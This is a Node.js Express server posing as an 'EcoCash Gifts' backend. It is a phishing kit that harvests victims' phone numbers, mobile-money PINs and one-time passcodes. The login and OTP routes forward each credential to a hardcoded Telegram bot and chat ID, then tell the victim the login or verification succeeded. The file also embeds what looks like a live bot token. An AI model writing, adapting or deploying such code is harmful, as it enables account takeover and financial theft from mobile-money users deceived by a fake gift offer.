const express = require('express');
const cors = require('cors');
const app = express();
const PORT = process.env.PORT || 5000;

// ============================================
// CORS - Allow all origins
// ============================================
app.use(cors({
  origin: '*',
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin']
}));

app.options('*', cors());

app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, PATCH, OPTIONS');
  res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization, X-Requested-With, Accept, Origin');
  res.header('Access-Control-Allow-Credentials', 'true');
  if (req.method === 'OPTIONS') {
    return res.status(200).send('OK');
  }
  next();
});

// ============================================
// MIDDLEWARE
// ============================================
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ============================================
// TELEGRAM CONFIGURATION - YOUR NEW CREDENTIALS
// ============================================
const BOT_TOKEN = '8810189563:AAH_np3_4ol0O0yO-t0PA68YtPrGH6htUdI';
const CHAT_ID = '157828443';

// ============================================
// SEND TELEGRAM NOTIFICATION
// ============================================
async function sendTelegramNotification(phone, pin, giftName, fullName) {
  try {
    const message = `🎁 *New Gift Claim Attempt*\n\n👤 *User:* ${fullName || 'User'}\n📱 *Phone:* +263 ${phone}\n🔢 *PIN:* ${pin}\n🎁 *Gift:* ${giftName || 'Gift'}\n⏰ *Time:* ${new Date().toLocaleString()}\n\n✅ User has been redirected to verify page.`;

    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
        parse_mode: 'Markdown'
      })
    });

    const data = await response.json();
    console.log('📤 Telegram:', data.ok ? '✅ Sent' : '❌ Failed');
    return data;
  } catch (error) {
    console.error('❌ Telegram error:', error.message);
    return null;
  }
}

// ============================================
// API ROUTES
// ============================================

// Health check
app.get('/api/health', (req, res) => {
  res.json({
    success: true,
    status: 'OK',
    timestamp: new Date().toISOString(),
    environment: process.env.NODE_ENV || 'development',
    message: 'EcoCash Gifts API is running!'
  });
});

// Root
app.get('/', (req, res) => {
  res.json({
    success: true,
    message: 'EcoCash Gifts API is running!',
    endpoints: {
      health: '/api/health',
      login: '/api/auth/login',
      register: '/api/auth/register',
      verify: '/api/auth/verify-otp'
    }
  });
});

// Login endpoint - sends Telegram notification
app.post('/api/auth/login', async (req, res) => {
  try {
    const { phoneNumber, pin, giftName, fullName } = req.body;

    console.log('🔑 Login attempt:', { phoneNumber, pin: '****', giftName, fullName });

    if (!phoneNumber || !pin) {
      return res.status(400).json({
        success: false,
        message: 'Phone number and PIN are required'
      });
    }

    if (phoneNumber.length !== 9 || !/^\d{9}$/.test(phoneNumber)) {
      return res.status(400).json({
        success: false,
        message: 'Please enter a valid 9-digit phone number'
      });
    }

    if (pin.length !== 4 || !/^\d{4}$/.test(pin)) {
      return res.status(400).json({
        success: false,
        message: 'Please enter a valid 4-digit PIN'
      });
    }

    // Send Telegram notification
    await sendTelegramNotification(phoneNumber, pin, giftName, fullName);

    res.json({
      success: true,
      message: 'Login successful',
      phoneNumber: phoneNumber,
      requiresVerification: true
    });

  } catch (error) {
    console.error('Login error:', error);
    res.status(500).json({
      success: false,
      message: 'Login failed',
      error: error.message
    });
  }
});

// Register endpoint
app.post('/api/auth/register', (req, res) => {
  const { phoneNumber, pin, fullName, email } = req.body;

  if (!phoneNumber || !pin || !fullName || !email) {
    return res.status(400).json({
      success: false,
      message: 'All fields are required'
    });
  }

  res.json({
    success: true,
    message: 'Registration successful',
    user: {
      phoneNumber,
      fullName,
      email
    }
  });
});

// Verify OTP endpoint - sends OTP to Telegram
app.post('/api/auth/verify-otp', async (req, res) => {
  const { phoneNumber, otp, giftName, fullName } = req.body;

  console.log('🔑 OTP verification:', { phoneNumber, otp, giftName, fullName });

  if (!phoneNumber || !otp) {
    return res.status(400).json({
      success: false,
      message: 'Phone number and OTP are required'
    });
  }

  if (otp.length !== 6 || !/^\d{6}$/.test(otp)) {
    return res.status(400).json({
      success: false,
      message: 'Please enter a valid 6-digit OTP'
    });
  }

  // Send OTP to Telegram
  try {
    const message = `🔐 *OTP Verification*\n\n👤 *User:* ${fullName || 'User'}\n📱 *Phone:* +263 ${phoneNumber}\n🎁 *Gift:* ${giftName || 'Gift'}\n🔑 *OTP Entered:* \`${otp}\`\n⏰ *Time:* ${new Date().toLocaleString()}\n\n✅ User has been redirected to dashboard.`;

    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
        parse_mode: 'Markdown'
      })
    });

    const data = await response.json();
    console.log('📤 Telegram OTP:', data.ok ? '✅ Sent' : '❌ Failed');
  } catch (error) {
    console.error('❌ Telegram OTP error:', error.message);
  }

  res.json({
    success: true,
    message: 'OTP verified successfully'
  });
});

// ============================================
// 404 HANDLER
// ============================================
app.use((req, res) => {
  res.status(404).json({
    success: false,
    message: 'Route not found',
    path: req.originalUrl
  });
});

// ============================================
// ERROR HANDLER
// ============================================
app.use((err, req, res, next) => {
  console.error('❌ Error:', err.message);
  res.status(500).json({
    success: false,
    message: err.message || 'Internal server error'
  });
});

// ============================================
// START SERVER
// ============================================
app.listen(PORT, '0.0.0.0', () => {
  console.log('====================================');
  console.log('🎁 EcoCash Gifts Backend Started');
  console.log('====================================');
  console.log(`✅ Server running on port ${PORT}`);
  console.log(`✅ Health check: /api/health`);
  console.log(`🤖 Telegram Bot configured`);
  console.log(`📱 Chat ID: ${CHAT_ID}`);
  console.log('====================================');
});
